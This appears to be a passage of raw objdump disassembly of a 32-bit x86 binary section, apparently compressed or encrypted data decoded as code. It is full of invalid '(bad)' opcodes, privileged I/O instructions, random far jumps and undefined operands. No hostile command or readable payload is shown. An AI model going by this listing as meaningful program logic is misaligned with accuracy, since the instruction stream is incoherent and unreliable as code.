  41d02a:	stos   DWORD PTR es:[edi],eax
  41d02b:	fdiv   QWORD PTR [edx+0x6e]
  41d02e:	inc    ecx
  41d02f:	dec    eax
  41d030:	sub    BYTE PTR [ecx],ah
  41d032:	jg     0x41cff5
  41d034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d035:	in     eax,dx
  41d036:	jmp    FWORD PTR [edx]
  41d038:	or     BYTE PTR [ebp+0x47a48abd],dh
  41d03e:	xchg   DWORD PTR [ebx+0x1ac1ab64],esi
  41d044:	popf   
  41d045:	and    eax,DWORD PTR [esi+eax*8-0x6deba8ce]
  41d04c:	sahf   
  41d04d:	push   ebp
  41d04e:	dec    esi
  41d04f:	mov    ecx,0x90560163
  41d054:	and    DWORD PTR [edi+ecx*8+0x55],ebp
  41d058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d059:	and    bl,ch
  41d05b:	xchg   esp,eax
  41d05c:	daa    
  41d05d:	inc    ecx
  41d05e:	daa    
  41d05f:	inc    edx
  41d060:	arpl   WORD PTR [eax+eax*8+0x13476e0d],bx
  41d067:	in     al,dx
  41d068:	xor    BYTE PTR [edx-0x2c16b957],dh
  41d06e:	push   0x4b
  41d070:	cmp    esi,DWORD PTR [ecx]
  41d072:	dec    ebp
  41d073:	xlat   BYTE PTR ds:[ebx]
  41d074:	pop    ebx
  41d075:	in     eax,0xce
  41d077:	add    al,0x35
  41d079:	sbb    eax,0xbb6bac95
  41d07e:	mov    DWORD PTR [edx+ebx*4+0x70],edi
  41d082:	jp     0x41d051
  41d084:	and    BYTE PTR [edx-0x6c5d6e4e],ch
  41d08a:	and    eax,0x5868264e
  41d08f:	sbb    ch,BYTE PTR [ecx+0x68]
  41d092:	mov    edx,0x2449b0b8
  41d097:	jb     0x41d060
  41d099:	mov    ebx,ss
  41d09b:	jns    0x41d09f
  41d09d:	push   edi
  41d09e:	fsub   DWORD PTR ds:0x4156a554
  41d0a4:	lods   al,BYTE PTR ds:[esi]
  41d0a5:	jmp    0x41d090
  41d0a7:	stos   DWORD PTR es:[edi],eax
  41d0a8:	shl    DWORD PTR [esi-0x60],cl
  41d0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0ac:	ins    DWORD PTR es:[edi],dx
  41d0ad:	pushf  
  41d0ae:	sbb    BYTE PTR [ecx],cl
  41d0b0:	xlat   BYTE PTR ds:[ebx]
  41d0b1:	cdq    
  41d0b2:	push   cs
  41d0b3:	icebp  
  41d0b4:	loope  0x41d08b
  41d0b6:	loop   0x41d0d0
  41d0b8:	xchg   esi,eax
  41d0b9:	imul   eax,DWORD PTR [eax+0x2588210],0xef6723bb
  41d0c3:	int    0x22
  41d0c5:	pop    ss
  41d0c6:	sub    dl,bh
  41d0c8:	stc    
  41d0c9:	loope  0x41d113
  41d0cb:	xchg   esp,eax
  41d0cc:	dec    eax
  41d0cd:	(bad)  
  41d0cf:	push   ebx
  41d0d0:	rol    BYTE PTR [edx-0x79ddb3da],cl
  41d0d6:	fsubr  st(2),st
  41d0d8:	sti    
  41d0d9:	aad    0x7
  41d0db:	dec    esi
  41d0dc:	sbb    eax,DWORD PTR [ebp-0x51]
  41d0df:	retf   0x236f
  41d0e2:	inc    edx
  41d0e3:	pop    ebx
  41d0e4:	add    al,0x2e
  41d0e6:	adc    BYTE PTR [ecx+0x3154fd29],cl
  41d0ec:	cli    
  41d0ed:	cdq    
  41d0ee:	jae    0x41d13f
  41d0f0:	lods   eax,DWORD PTR ds:[esi]
  41d0f1:	push   ebp
  41d0f2:	out    0x2a,al
  41d0f4:	inc    ebp
  41d0f5:	shr    DWORD PTR [edx+eiz*2-0x63],cl
  41d0f9:	jl     0x41d156
  41d0fb:	or     edi,DWORD PTR [eax]
  41d0fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0fe:	xor    ah,BYTE PTR [ebx+0x41]
  41d101:	or     BYTE PTR [edi-0x5e],0x30
  41d105:	inc    ebx
  41d106:	cdq    
  41d107:	loopne 0x41d0f5
  41d109:	shl    BYTE PTR fs:[edi],0x81
  41d10d:	repz add dh,BYTE PTR [ebp-0x1a]
  41d111:	lea    eax,[ebx+0x669bb695]
  41d117:	outs   dx,DWORD PTR ds:[esi]
  41d118:	sub    edx,DWORD PTR [ebp-0x8]
  41d11b:	lock scas al,BYTE PTR es:[edi]
  41d11d:	pusha  
  41d11e:	scas   al,BYTE PTR es:[edi]
  41d11f:	sub    eax,0x1cc5fc8a
  41d124:	stos   BYTE PTR es:[edi],al
  41d125:	inc    esp
  41d126:	fidiv  DWORD PTR [edx+0x9]
  41d129:	push   eax
  41d12a:	adc    DWORD PTR [esi-0x38611e62],ecx
  41d130:	dec    esi
  41d131:	js     0x41d193
  41d133:	jb     0x41d111
  41d135:	push   cs
  41d136:	mov    esp,0x675fa6c4
  41d13b:	push   eax
  41d13c:	lods   al,BYTE PTR ds:[esi]
  41d13d:	mov    cl,0x5d
  41d13f:	inc    ebx
  41d140:	jp     0x41d1a7
  41d142:	jl     0x41d1c3
  41d144:	mul    DWORD PTR [edx-0x54]
  41d147:	adc    edi,DWORD PTR [ebx+0x15]
  41d14a:	ja     0x41d1bc
  41d14c:	mov    WORD PTR [ebx+0x3b6043a2],?
  41d152:	jae    0x41d117
  41d154:	inc    ebp
  41d155:	or     al,0x89
  41d157:	sbb    ch,BYTE PTR [ecx+eax*8-0x7a]
  41d15b:	stc    
  41d15c:	cmp    al,0xf1
  41d15e:	hlt    
  41d15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d160:	addr16 into 
  41d162:	cld    
  41d163:	pop    ss
  41d164:	lahf   
  41d165:	fistp  DWORD PTR [ebx-0x1dd2fa0d]
  41d16b:	pop    ds
  41d16c:	mov    WORD PTR [edi],cs
  41d16e:	arpl   WORD PTR cs:[edx+0x1],ax
  41d172:	ret    0xdee6
  41d175:	jmp    0x794b:0x5ea37c0a
  41d17c:	clc    
  41d17d:	cmp    al,0xd5
  41d17f:	dec    eax
  41d180:	pop    es
  41d181:	cld    
  41d182:	sub    BYTE PTR [esi-0x1f],bl
  41d185:	popf   
  41d186:	xchg   DWORD PTR [ebx+0x2e],eax
  41d189:	xor    BYTE PTR [esi-0x560bd0f7],bl
  41d18f:	lods   eax,DWORD PTR ds:[esi]
  41d190:	jle    0x41d1f9
  41d192:	ins    DWORD PTR es:[edi],dx
  41d193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d194:	data16 data16 jo 0x41d1c5
  41d198:	jmp    0x4fcd:0x9eb60253
  41d19f:	mov    DWORD PTR [ebx],0x7cda90ad
  41d1a5:	cmp    eax,0x584ae473
  41d1aa:	dec    eax
  41d1ab:	dec    edx
  41d1ac:	cwde   
  41d1ad:	mov    ebp,0x94b2d7aa
  41d1b2:	jno    0x41d1a5
  41d1b4:	cmp    edx,DWORD PTR [esp+eax*8+0x13]
  41d1b8:	movd   mm2,DWORD PTR [ecx-0x505a0d59]
  41d1bf:	scas   al,BYTE PTR es:[edi]
  41d1c0:	push   edx
  41d1c1:	retf   
  41d1c2:	ret    0x497f
  41d1c5:	cdq    
  41d1c6:	std    
  41d1c7:	push   cs
  41d1c8:	lds    esi,FWORD PTR [ecx+0x2d286460]
  41d1ce:	ja     0x41d20c
  41d1d0:	mov    eax,esp
  41d1d2:	inc    ebx
  41d1d3:	pop    ds
  41d1d4:	stc    
  41d1d5:	out    0x55,al
  41d1d7:	out    dx,eax
  41d1d8:	addr16 add al,0x86
  41d1db:	in     al,dx
  41d1dc:	cld    
  41d1dd:	or     eax,0xddfe006
  41d1e2:	add    DWORD PTR [edx-0x73],edx
  41d1e5:	nop
  41d1e6:	lea    edi,[ebx-0x51]
  41d1e9:	cld    
  41d1ea:	adc    eax,0x63b3db94
  41d1ef:	test   BYTE PTR [ebx],dl
  41d1f1:	adc    ecx,DWORD PTR [eax*2-0x4df9d89b]
  41d1f8:	stc    
  41d1f9:	pop    ebx
  41d1fa:	pop    ds
  41d1fb:	cdq    
  41d1fc:	(bad)  
  41d1fd:	mov    WORD PTR [ebp+0x34b70250],gs
  41d203:	(bad)  
  41d204:	push   ecx
  41d205:	or     ebp,DWORD PTR ds:0x3fcd4eab
  41d20b:	add    esp,esp
  41d20d:	adc    eax,DWORD PTR [edx+0x618f5751]
  41d213:	jns    0x41d1b4
  41d215:	mov    eax,0xedfaa50d
  41d21a:	mov    bh,0x99
  41d21c:	jmp    0xba4b:0xa3419223
  41d223:	ja     0x41d278
  41d225:	mov    bl,0x6e
  41d227:	xchg   DWORD PTR [eax-0x4a],ebp
  41d22a:	xor    DWORD PTR [ebp+0x63ecc885],0x92de40e2
  41d234:	fwait
  41d235:	test   eax,0x869ad81b
  41d23a:	out    dx,eax
  41d23b:	and    eax,DWORD PTR [eax-0x29]
  41d23e:	aad    0x21
  41d240:	xchg   edi,eax
  41d241:	pushf  
  41d242:	sar    DWORD PTR [eax-0x72],0xc7
  41d246:	mov    esi,0x4b289cff
  41d24b:	push   cs
  41d24c:	inc    eax
  41d24d:	out    dx,eax
  41d24e:	popa   
  41d24f:	push   ds
  41d250:	imul   edx,DWORD PTR [esi],0x3b9e4dac
  41d256:	hlt    
  41d257:	ds push edx
  41d259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d25a:	sub    ebp,DWORD PTR [edx+0x5c52c1a5]
  41d260:	push   ecx
  41d261:	lock jnp 0x41d1e6
  41d264:	ins    BYTE PTR es:[edi],dx
  41d265:	mov    ecx,DWORD PTR [ecx+ebp*1]
  41d268:	sbb    eax,0x7da43559
  41d26d:	xchg   ebp,eax
  41d26e:	push   edi
  41d26f:	in     al,0xca
  41d271:	mov    esi,0xa8cf75f7
  41d276:	add    al,0x1d
  41d278:	outs   dx,DWORD PTR ds:[esi]
  41d279:	es js  0x41d2fa
  41d27c:	fnstcw WORD PTR [edx+esi*8+0x1c97588a]
  41d283:	loopne 0x41d2a7
  41d285:	and    eax,0x5775178
  41d28a:	in     eax,0x66
  41d28c:	mov    ecx,0x41aafa3c
  41d291:	xchg   ebp,eax
  41d292:	push   ss
  41d293:	sub    eax,0xa48bc9f
  41d298:	sub    edx,0xa
  41d29b:	cmp    DWORD PTR [edi+eax*4+0x7d],ebp
  41d29f:	inc    esp
  41d2a0:	in     eax,0xc4
  41d2a2:	aam    0x8c
  41d2a4:	lods   al,BYTE PTR ds:[esi]
  41d2a5:	jge    0x41d269
  41d2a7:	pop    ebx
  41d2a8:	gs dec esi
  41d2aa:	ja     0x41d25a
  41d2ac:	jecxz  0x41d26c
  41d2ae:	cmp    DWORD PTR [ecx],ebp
  41d2b0:	sar    DWORD PTR [esi-0x72baa44b],0x77
  41d2b7:	stc    
  41d2b8:	rcr    BYTE PTR [ecx],1
  41d2ba:	scas   al,BYTE PTR es:[edi]
  41d2bb:	and    ecx,DWORD PTR [ebp-0x14]
  41d2be:	inc    edi
  41d2bf:	ja     0x41d27f
  41d2c1:	mov    dl,0xc8
  41d2c3:	fst    QWORD PTR [ebx]
  41d2c5:	sub    eax,0xe2dbd801
  41d2ca:	pop    ecx
  41d2cb:	das    
  41d2cc:	xor    al,0x73
  41d2ce:	jp     0x41d2a1
  41d2d0:	lds    ebx,FWORD PTR [esi]
  41d2d2:	sbb    al,0x99
  41d2d4:	enter  0x24bc,0x9c
  41d2d8:	cmp    DWORD PTR [eax+0x3f],ebx
  41d2db:	mov    dl,0x13
  41d2dd:	in     eax,0x91
  41d2df:	arpl   WORD PTR [esi-0x32],ax
  41d2e2:	in     al,dx
  41d2e3:	cs lahf 
  41d2e5:	inc    esp
  41d2e6:	jbe    0x41d356
  41d2e8:	and    eax,0x5484641a
  41d2ed:	jne    0x41d2f3
  41d2ef:	jno    0x41d2a6
  41d2f1:	mov    DWORD PTR [eax-0x15],edx
  41d2f4:	and    esi,DWORD PTR [ebx+0x48]
  41d2f7:	sub    ch,bh
  41d2f9:	test   DWORD PTR [eax+edx*1],ebp
  41d2fc:	push   ds
  41d2fd:	xchg   ebp,eax
  41d2fe:	das    
  41d2ff:	aas    
  41d300:	scas   al,BYTE PTR es:[edi]
  41d301:	cwde   
  41d302:	push   esi
  41d303:	outs   dx,DWORD PTR ds:[esi]
  41d304:	push   edx
  41d305:	xchg   edi,eax
  41d306:	sar    DWORD PTR [eax+0x4c40cda2],1
  41d30c:	stc    
  41d30d:	mov    dl,0xc
  41d30f:	cld    
  41d310:	stos   BYTE PTR es:[edi],al
  41d311:	mov    dh,BYTE PTR [ebx]
  41d313:	dec    esp
  41d314:	test   BYTE PTR [esi],al
  41d316:	loopne 0x41d31c
  41d318:	inc    edx
  41d319:	mov    esp,0x98bb020a
  41d31e:	(bad)  
  41d31f:	mov    cl,0x61
  41d321:	das    
  41d322:	es inc ebp
  41d324:	inc    ecx
  41d325:	xor    ecx,DWORD PTR [edx+ecx*1-0x197c37ba]
  41d32c:	ins    DWORD PTR es:[edi],dx
  41d32d:	jnp    0x41d2b9
  41d32f:	in     al,dx
  41d330:	xchg   ebp,eax
  41d331:	stos   BYTE PTR es:[edi],al
  41d332:	jle    0x41d2b4
  41d334:	and    BYTE PTR [esi+0x30],ah
  41d337:	or     ecx,DWORD PTR [eax+0x1e]
  41d33a:	push   edx
  41d33b:	sbb    ebp,DWORD PTR [edx]
  41d33d:	das    
  41d33e:	out    0xb8,al
  41d340:	jbe    0x41d2e0
  41d342:	mov    eax,ds:0xc595e03a
  41d347:	cmc    
  41d348:	inc    eax
  41d349:	call   0xbcd33c35
  41d34e:	lds    esi,FWORD PTR [eax+0x6cd6d2a]
  41d354:	or     al,0x62
  41d356:	pop    eax
  41d357:	outs   dx,DWORD PTR ds:[esi]
  41d358:	sar    dl,1
  41d35a:	popf   
  41d35b:	and    eax,DWORD PTR [ebx-0x1e]
  41d35e:	ds dec ecx
  41d360:	(bad)  
  41d361:	dec    ebp
  41d362:	inc    ecx
  41d363:	lds    esp,FWORD PTR [ebx-0x298a0e77]
  41d369:	dec    edx
  41d36a:	in     eax,dx
  41d36b:	mov    al,0xe6
  41d36d:	sub    al,0xb7
  41d36f:	pop    es
  41d370:	dec    ecx
  41d371:	and    al,0xb1
  41d373:	arpl   WORD PTR [edx+0x48],cx
  41d376:	mov    dl,0xd9
  41d378:	push   es
  41d379:	jmp    0x415533d8
  41d37e:	sbb    eax,0xd1df670d
  41d383:	mov    dh,0x16
  41d385:	lock mov ch,0x54
  41d388:	ret    0xe32c
  41d38b:	(bad)  [ebx-0x6f]
  41d38e:	(bad)  
  41d38f:	mov    ss,WORD PTR [ecx-0x5c]
  41d392:	push   ss
  41d393:	fsub   st(7),st
  41d395:	inc    BYTE PTR [eiz*4-0x78d316e7]
  41d39c:	sub    al,0xb
  41d39e:	mov    ch,0x51
  41d3a0:	je     0x41d3c4
  41d3a2:	inc    eax
  41d3a3:	not    BYTE PTR [ecx]
  41d3a5:	jecxz  0x41d3e7
  41d3a7:	hlt    
  41d3a8:	and    edx,DWORD PTR [ebx+ebp*8+0x61]
  41d3ac:	or     BYTE PTR [edi-0xf],al
  41d3af:	test   al,0xd
  41d3b1:	dec    edi
  41d3b2:	and    BYTE PTR [esi+0x3fa1c7f7],0x35
  41d3b9:	fldln2 
  41d3bb:	inc    edi
  41d3bc:	cmp    al,BYTE PTR [ecx+0x56]
  41d3bf:	addr16 aam 0x8d
  41d3c2:	and    eax,0x1be498d7
  41d3c7:	loope  0x41d3cc
  41d3c9:	push   ds
  41d3ca:	sbb    BYTE PTR [eax+0xfb91ccd],bl
  41d3d0:	je     0x41d381
  41d3d2:	and    ecx,DWORD PTR [edx+0x44afc666]
  41d3d8:	sub    BYTE PTR ss:[edi-0x46],0xff
  41d3dd:	sahf   
  41d3de:	les    edi,FWORD PTR [ebx]
  41d3e0:	inc    esi
  41d3e1:	mov    ebp,0x6073937a
  41d3e6:	das    
  41d3e7:	aaa    
  41d3e8:	sbb    ebp,DWORD PTR [ebp+0x46]
  41d3eb:	jg     0x41d398
  41d3ed:	pop    ds
  41d3ee:	pusha  
  41d3ef:	std    
  41d3f0:	jno    0x41d401
  41d3f2:	push   ss
  41d3f3:	xchg   esp,eax
  41d3f4:	mov    bh,0x30
  41d3f6:	aas    
  41d3f7:	mov    eax,0xb02746aa
  41d3fc:	scas   eax,DWORD PTR es:[edi]
  41d3fd:	push   esp
  41d3fe:	jle    0x41d444
  41d400:	lds    esi,FWORD PTR [ecx]
  41d402:	xchg   edx,eax
  41d403:	xchg   esi,eax
  41d404:	les    ebp,FWORD PTR [ecx-0x18940bb8]
  41d40a:	xlat   BYTE PTR ds:[ebx]
  41d40b:	push   es
  41d40c:	shr    DWORD PTR [eax+0xe56ba0b],0x60
  41d413:	dec    esp
  41d414:	push   ss
  41d415:	lods   al,BYTE PTR ds:[esi]
  41d416:	fst    QWORD PTR es:[edi+0x25]
  41d41a:	sbb    al,0x57
  41d41c:	sbb    eax,0xed3435eb
  41d421:	sub    al,0x6c
  41d423:	clc    
  41d424:	mov    dh,0x2b
  41d426:	aam    0x0
  41d428:	mov    cs,WORD PTR [esi-0x4a]
  41d42b:	dec    ecx
  41d42c:	and    DWORD PTR [edi],ebp
  41d42e:	xlat   BYTE PTR ds:[ebx]
  41d42f:	(bad)  
  41d430:	cli    
  41d431:	call   0x9425:0x692848c5
  41d438:	outs   dx,DWORD PTR ds:[esi]
  41d439:	jbe    0x41d442
  41d43b:	ret    0xae61
  41d43e:	and    DWORD PTR [eax-0x3c],0xccbd138b
  41d445:	inc    esp
  41d446:	mov    ds:0xee232e25,eax
  41d44b:	jecxz  0x41d3f2
  41d44d:	fxam   
  41d44f:	clc    
  41d450:	jp     0x41d4be
  41d452:	retf   
  41d453:	xor    ecx,eax
  41d455:	jnp    0x41d3fa
  41d457:	or     DWORD PTR [edi+0x5a79da73],edi
  41d45d:	push   eax
  41d45e:	mov    ah,0x2a
  41d460:	gs clc 
  41d462:	mov    dh,BYTE PTR ds:0xdd106f19
  41d468:	mov    eax,ds:0xe799c178
  41d46d:	in     al,0x56
  41d46f:	xchg   DWORD PTR [esi+0x7e],eax
  41d472:	test   edi,esp
  41d474:	call   0xb058a779
  41d479:	push   0x9fd66e15
  41d47e:	loope  0x41d47e
  41d480:	add    eax,0x3232179e
  41d485:	ror    dh,0xa7
  41d488:	inc    esi
  41d489:	stc    
  41d48a:	jb     0x41d44c
  41d48c:	sbb    BYTE PTR [edx+0x6a2ac1f],dh
  41d492:	lds    esp,FWORD PTR [edx-0x28]
  41d495:	inc    esi
  41d496:	shl    BYTE PTR [ecx-0x48],0xde
  41d49a:	loopne 0x41d48d
  41d49c:	ds call 0x82de:0x326c49c1
  41d4a4:	daa    
  41d4a5:	pop    ebp
  41d4a6:	dec    esi
  41d4a7:	imul   ebp,esp,0x2126348f
  41d4ad:	jmp    0x41d482
  41d4af:	inc    ecx
  41d4b0:	inc    ecx
  41d4b1:	(bad)  
  41d4b2:	xor    al,0x85
  41d4b4:	sub    BYTE PTR [edx],cl
  41d4b6:	es idiv al
  41d4b9:	test   al,bl
  41d4bb:	or     al,0x65
  41d4bd:	dec    edx
  41d4be:	xchg   ecx,eax
  41d4bf:	outs   dx,BYTE PTR ds:[esi]
  41d4c0:	sub    ebp,DWORD PTR [edi-0x2dd95544]
  41d4c6:	idiv   BYTE PTR [ebp+0x8]
  41d4c9:	lock mov eax,0x74eddec1
  41d4cf:	out    dx,eax
  41d4d0:	test   eax,0x5bce74cd
  41d4d5:	call   0x57d9:0x3d3f32af
  41d4dc:	stos   BYTE PTR es:[edi],al
  41d4dd:	popf   
  41d4de:	jp     0x41d48d
  41d4e0:	test   BYTE PTR [ecx+eax*4],0xe5
  41d4e4:	dec    ebp
  41d4e5:	in     eax,dx
  41d4e6:	pop    es
  41d4e7:	scas   al,BYTE PTR es:[edi]
  41d4e8:	call   0xa019:0x3cc8b0c3
  41d4ef:	dec    esi
  41d4f0:	mov    ebx,0xfe559f67
  41d4f5:	ss (bad) 
  41d4f8:	xchg   ch,cl
  41d4fa:	adc    esp,ecx
  41d4fc:	cmp    esp,esi
  41d4fe:	outs   dx,BYTE PTR ds:[esi]
  41d4ff:	pusha  
  41d500:	imul   esp,DWORD PTR [esi+0x73],0xffffffa8
  41d504:	leave  
  41d505:	push   eax
  41d506:	xor    ebx,esi
  41d508:	int    0xe6
  41d50a:	cdq    
  41d50b:	or     al,0xf
  41d50d:	sub    BYTE PTR [esi+0x6e],al
  41d510:	jns    0x41d4bf
  41d512:	ss aam 0x36
  41d515:	or     ecx,ebp
  41d517:	mov    edi,0x594bd2a5
  41d51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d51d:	(bad)  
  41d51e:	loopne 0x41d519
  41d520:	retf   
  41d521:	adc    DWORD PTR [esi+eax*1+0x6aeef1a0],edi
  41d528:	retf   0x183d
  41d52b:	mov    ds:0x484cb21c,ax
  41d531:	(bad)  
  41d532:	hlt    
  41d533:	and    ecx,edi
  41d535:	sub    DWORD PTR [esi+0x4],edx
  41d538:	mov    dl,0xa5
  41d53a:	push   edi
  41d53b:	jbe    0x41d55b
  41d53d:	and    al,0xf
  41d53f:	shr    BYTE PTR [ecx-0x7080c0a4],1
  41d545:	stos   BYTE PTR es:[edi],al
  41d546:	mov    ebx,0x298da4b4
  41d54b:	sbb    BYTE PTR [ecx+0x73d9b223],bh
  41d551:	retf   0xef5
  41d554:	push   esp
  41d555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d556:	pop    esp
  41d557:	push   esp
  41d558:	lds    esp,FWORD PTR [esi]
  41d55a:	push   0xffffffe5
  41d55c:	jae    0x41d544
  41d55e:	pop    es
  41d55f:	mov    eax,0x97b7b5c2
  41d564:	imul   ebx,DWORD PTR [edx-0x50],0xffffff9a
  41d568:	xor    al,0x73
  41d56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d56b:	retf   
  41d56c:	test   DWORD PTR [ebx-0x71f30dce],edx
  41d572:	pop    ebx
  41d573:	mov    ebp,0x3842fede
  41d578:	imul   esp,ebx,0x7f
  41d57b:	cmp    cl,BYTE PTR [esi-0x767196c8]
  41d581:	setb   BYTE PTR ds:[ebx-0xb]
  41d586:	lahf   
  41d587:	in     al,0xfe
  41d589:	and    al,0xa4
  41d58b:	fwait
  41d58c:	xchg   DWORD PTR [ecx],ebp
  41d58e:	mov    edx,0x97b9142
  41d593:	pop    edi
  41d594:	lods   eax,DWORD PTR ds:[esi]
  41d595:	mov    edi,0x49419f98
  41d59a:	xor    al,0xb9
  41d59c:	jle    0x41d616
  41d59e:	mov    edi,DWORD PTR [edi-0x35]
  41d5a1:	dec    eax
  41d5a2:	std    
  41d5a3:	fdivr  DWORD PTR ds:0x6f9a9389
  41d5a9:	fnstsw WORD PTR ds:0xffe835ba
  41d5af:	push   cs
  41d5b0:	int    0x42
  41d5b2:	cmc    
  41d5b3:	sub    cl,dl
  41d5b5:	lahf   
  41d5b6:	dec    ebp
  41d5b7:	mov    eax,0x1be494a8
  41d5bc:	iret   
  41d5bd:	sbb    ebx,DWORD PTR [eax]
  41d5bf:	jb     0x41d5f0
  41d5c1:	ss xor al,0x93
  41d5c4:	jns    0x41d569
  41d5c6:	mov    esp,0x661f9609
  41d5cb:	and    al,0x46
  41d5cd:	scas   al,BYTE PTR es:[edi]
  41d5ce:	mov    ds:0xc3e85271,eax
  41d5d3:	cwde   
  41d5d4:	mov    fs,WORD PTR [eax+ebp*1]
  41d5d7:	inc    eax
  41d5d8:	clc    
  41d5d9:	test   eax,0xbcb012ca
  41d5de:	sbb    eax,0xf4ce427b
  41d5e3:	jo     0x41d5cf
  41d5e5:	cmp    eax,0x5a1f9e40
  41d5ea:	jne    0x41d5c0
  41d5ec:	add    al,0xe9
  41d5ee:	fmul   DWORD PTR [edx+ebx*2-0x72]
  41d5f2:	sbb    ebp,DWORD PTR [bp+di-0x50b2]
  41d5f7:	inc    edi
  41d5f8:	shl    BYTE PTR [ecx],1
  41d5fa:	out    0x91,al
  41d5fc:	stos   DWORD PTR es:[edi],eax
  41d5fd:	jno    0x41d62f
  41d5ff:	lock push edi
  41d601:	mov    ebx,0xd48ac425
  41d606:	inc    esp
  41d607:	sub    DWORD PTR [esp+eiz*2],0x4088e9dd
  41d60e:	mov    WORD PTR [ebx],?
  41d610:	pop    es
  41d611:	clc    
  41d612:	cdq    
  41d613:	sbb    DWORD PTR [esi-0x1e],eax
  41d616:	or     ebp,DWORD PTR [ecx]
  41d618:	mov    eax,0xbf07ba9a
  41d61d:	mov    bl,0x1b
  41d61f:	sahf   
  41d620:	pop    ds
  41d621:	shl    BYTE PTR [edi+0x14],1
  41d624:	adc    BYTE PTR [ecx-0x656d02ff],bl
  41d62a:	add    esi,DWORD PTR [edi-0x7476c132]
  41d630:	fcom   QWORD PTR [eax-0x7d5164d9]
  41d636:	jecxz  0x41d5f2
  41d638:	outs   dx,BYTE PTR ds:[esi]
  41d639:	or     DWORD PTR [edi-0x28],eax
  41d63c:	mov    ebx,0xf83b7bff
  41d641:	pushf  
  41d642:	pop    ebx
  41d643:	nop
  41d644:	xor    dh,BYTE PTR [esi-0x54]
  41d647:	jbe    0x41d5ee
  41d649:	inc    ecx
  41d64a:	jmp    0x3095:0xff5276af
  41d651:	leave  
  41d652:	adc    eax,0x35d71f22
  41d657:	shr    DWORD PTR [ecx],1
  41d659:	sbb    al,0xb1
  41d65b:	cmp    al,0x3
  41d65d:	inc    ebp
  41d65e:	(bad)  
  41d65f:	test   al,0x31
  41d661:	cld    
  41d662:	cmp    eax,0xbbf02a2a
  41d667:	fnstcw WORD PTR [edx+eiz*8+0x7d]
  41d66b:	jmp    0x7d7807ea
  41d670:	jp     0x41d6c4
  41d672:	aam    0x56
  41d674:	cmp    DWORD PTR [esi],eax
  41d676:	scas   eax,DWORD PTR es:[edi]
  41d677:	enter  0x77f3,0xef
  41d67b:	pop    eax
  41d67c:	lds    ecx,FWORD PTR [esi]
  41d67e:	xchg   ebp,eax
  41d67f:	aas    
  41d680:	jge    0x41d63d
  41d682:	ror    DWORD PTR [edi+edx*8-0x3c7d9bf9],0x8a
  41d68a:	addr16 push eax
  41d68c:	sub    eax,0xc5adf088
  41d691:	or     eax,0xfb3c82a6
  41d696:	popf   
  41d697:	das    
  41d698:	inc    eax
  41d699:	dec    esi
  41d69a:	add    DWORD PTR [eax+0x34],ebx
  41d69d:	inc    ebx
  41d69e:	mov    bl,0x2f
  41d6a0:	test   al,0x1d
  41d6a2:	cmp    DWORD PTR [ebp+0x44c9b966],edx
  41d6a8:	stos   DWORD PTR es:[edi],eax
  41d6a9:	dec    ebx
  41d6aa:	sub    edx,DWORD PTR ds:0x8f93c66b
  41d6b0:	scas   eax,DWORD PTR es:[edi]
  41d6b1:	(bad)  
  41d6b2:	hlt    
  41d6b3:	es jnp 0x41d707
  41d6b6:	mov    al,ds:0x3fd1ab7f
  41d6bb:	out    0x56,eax
  41d6bd:	clc    
  41d6be:	mov    dh,0x52
  41d6c0:	mov    ecx,0xafbfebc7
  41d6c5:	in     eax,0x29
  41d6c7:	inc    ebx
  41d6c8:	push   0x15
  41d6ca:	add    cl,ch
  41d6cc:	mov    bl,bl
  41d6ce:	stos   BYTE PTR es:[edi],al
  41d6cf:	nop
  41d6d0:	sub    eax,0xe721a24c
  41d6d5:	mov    edx,0x78ee762a
  41d6da:	addr16 pop eax
  41d6dc:	add    DWORD PTR [edx+0x29599835],ebp
  41d6e2:	cdq    
  41d6e3:	xor    DWORD PTR [edx+edi*1-0x49],esi
  41d6e7:	pusha  
  41d6e8:	mov    ebx,eax
  41d6ea:	lock adc eax,0xaf8fbb1f
  41d6f0:	add    al,0x40
  41d6f2:	mov    edi,esp
  41d6f4:	mov    ds:0x5a0b702d,eax
  41d6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6fa:	loopne 0x41d765
  41d6fc:	mov    DWORD PTR [edx],esi
  41d6fe:	arpl   bp,cx
  41d700:	imul   DWORD PTR [esi]
  41d702:	(bad)  
  41d703:	jmp    0x26ea:0xe710604f
  41d70a:	ins    DWORD PTR es:[edi],dx
  41d70b:	jmp    0x6c00396c
  41d710:	outs   dx,DWORD PTR ds:[esi]
  41d711:	scas   eax,DWORD PTR es:[edi]
  41d712:	mov    ah,0xb4
  41d714:	out    0x34,al
  41d716:	sti    
  41d717:	lods   eax,DWORD PTR ds:[esi]
  41d718:	mov    edx,0xe1142430
  41d71d:	sti    
  41d71e:	pop    ss
  41d71f:	adc    al,BYTE PTR [ecx+0x60]
  41d722:	add    edx,DWORD PTR [edx-0x73]
  41d725:	and    DWORD PTR [ebx-0x58],edi
  41d728:	add    al,0xc9
  41d72a:	mov    ebx,ebx
  41d72c:	push   ebp
  41d72d:	scas   al,BYTE PTR es:[edi]
  41d72e:	pop    ecx
  41d72f:	lods   al,BYTE PTR ds:[esi]
  41d730:	adc    al,0x8d
  41d732:	hlt    
  41d733:	jge    0x41d6cf
  41d735:	adc    BYTE PTR [eax],ch
  41d737:	inc    ebx
  41d738:	xor    eax,0xe8acf46a
  41d73d:	fld    QWORD PTR [esp+ebp*1-0x53]
  41d741:	dec    ebx
  41d742:	ss je  0x41d734
  41d745:	sar    eax,cl
  41d747:	and    cl,ch
  41d749:	sar    BYTE PTR [edi],cl
  41d74b:	stos   BYTE PTR es:[edi],al
  41d74c:	lahf   
  41d74d:	sahf   
  41d74e:	xchg   esp,eax
  41d74f:	xchg   edi,ebx
  41d751:	pop    edx
  41d752:	stos   DWORD PTR es:[edi],eax
  41d753:	inc    esp
  41d754:	ds jae 0x41d7c6
  41d757:	cld    
  41d758:	ficom  DWORD PTR [edx]
  41d75a:	sbb    ecx,DWORD PTR [edx]
